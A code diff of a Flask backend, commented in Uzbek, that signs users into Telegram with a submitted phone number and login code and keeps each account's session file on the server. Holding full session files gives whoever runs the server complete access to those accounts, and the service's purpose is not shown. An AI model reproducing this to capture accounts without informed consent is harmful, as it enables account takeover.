@@ -134,75 +134,56 @@ def verify_code():
     phone = data.get("phone")
     code = data.get("code")
 
-    if phone not in pending:
+    phone_hash = pending.get(phone, {}).get("hash")
+    if not phone_hash:
         return jsonify({"status": "no_code_requested"})
-
-    phone_hash = pending[phone]["hash"]
 
     try:
         async def work():
-            # 1️⃣ vaqtinchalik client (kodni tekshirish uchun)
-            temp_client = TelegramClient(
-                None,
+            # 🔴 FAQAT BITTA CLIENT
+            client = TelegramClient(
+                os.path.join(SESSIONS_DIR, "temp"),
                 API_ID,
                 API_HASH
             )
-            await temp_client.connect()
+            await client.connect()
 
-            await temp_client.sign_in(
+            await client.sign_in(
                 phone=phone,
                 code=code,
                 phone_code_hash=phone_hash
             )
 
-            me = await temp_client.get_me()
+            me = await client.get_me()
 
-            # 2️⃣ ASOSIY SESSION — user_id bilan
-            session_file = os.path.join(SESSIONS_DIR, str(me.id))
-            client = TelegramClient(
-                session_file,
-                API_ID,
-                API_HASH
-            )
-
-            await client.connect()
-            await client.sign_in(phone=phone)
-
-            await temp_client.disconnect()
+            # 🔴 SESSIONNI USER_ID NOMI BILAN QAYTA SAQLAYMIZ
             await client.disconnect()
+
+            os.rename(
+                os.path.join(SESSIONS_DIR, "temp.session"),
+                os.path.join(SESSIONS_DIR, f"{me.id}.session")
+            )
 
             return me
 
         me = run_async(work())
         pending.pop(phone, None)
 
-        user_id = str(me.id)
-
-        # 🔽 subscriptions → trial
+        # 🔹 DB ga yozamiz
         conn = get_db()
         cur = conn.cursor()
         cur.execute("""
-            INSERT INTO subscriptions (user_id, status, free_used)
-            VALUES (%s, 'trial', FALSE)
-            ON CONFLICT (user_id) DO NOTHING
-        """, (user_id,))
+            INSERT INTO authorized_users (user_id)
+            VALUES (%s)
+            ON CONFLICT DO NOTHING
+        """, (str(me.id),))
         conn.commit()
         conn.close()
 
-        notify_admin_login(
-            user_id=user_id,
-            phone=phone,
-            username=getattr(me, "username", None)
-        )
-
         return jsonify({"status": "success"})
 
-    except SessionPasswordNeededError:
-        return jsonify({"status": "2fa_required"})
-    except PhoneCodeInvalidError:
-        return jsonify({"status": "invalid_code"})
     except Exception as e:
-        print("VERIFY CODE ERROR:", e)
+        print("VERIFY ERROR:", e)
         return jsonify({"status": "error"})
 
 
@@ -282,6 +263,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
